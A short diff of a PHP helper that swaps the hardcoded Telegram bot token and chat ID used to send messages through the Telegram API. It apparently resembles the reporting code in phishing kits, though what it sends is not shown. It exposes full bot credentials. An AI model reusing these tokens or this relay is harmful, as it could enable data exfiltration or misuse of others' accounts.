@@ -12,8 +12,8 @@
 
 function telegram_send($message, $encodage) {
     $curl = curl_init();
-    $api_key  = '7275654860:AAF-1jh2m9_YLiajYieHBUCzUPF-a_VyUnc';
-    $chat_id  = '6590534450';
+    $api_key  = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A';
+    $chat_id  = '6297861735';
     $format   = 'HTML';
     $url = 'https://api.telegram.org/bot' . $api_key .
            '/sendMessage?chat_id=' . $chat_id .
